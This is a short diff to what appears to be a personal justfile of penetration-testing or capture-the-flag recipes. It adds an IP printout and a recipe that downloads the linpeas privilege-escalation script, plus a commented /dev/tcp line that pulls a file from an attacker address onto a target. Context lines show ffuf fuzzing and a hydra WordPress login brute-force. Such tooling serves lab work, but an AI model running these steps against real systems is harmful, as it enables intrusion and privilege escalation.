@@ -92,7 +92,7 @@ http:
 	echo "paths 60" | anew todo.txt
 
 wl:
-	@find /usr/share/seclists/ -type f | fzf
+	@find . /usr/share/seclists/ -type f | fzf
 
 path_fuzz:
 	ffuf -u http://$(hack ip)/FUZZ -w $(hack wl) -recursion -od ffufo -ac
@@ -109,6 +109,7 @@ rev port:
 
 #start a http server for the current directory
 hs port:
+	ip addr | grep inet | sort
 	python3 -m http.server {{port}}
 
 sqliraw:
@@ -192,3 +193,6 @@ wordpress:
 	# hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 	echo "wordpress/brute_force_login 60" | anew todo.txt
 
+linpeas:
+	curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+#cat > l < /dev/tcp/10.10.14.3/8888 # if the server doesn't have nc
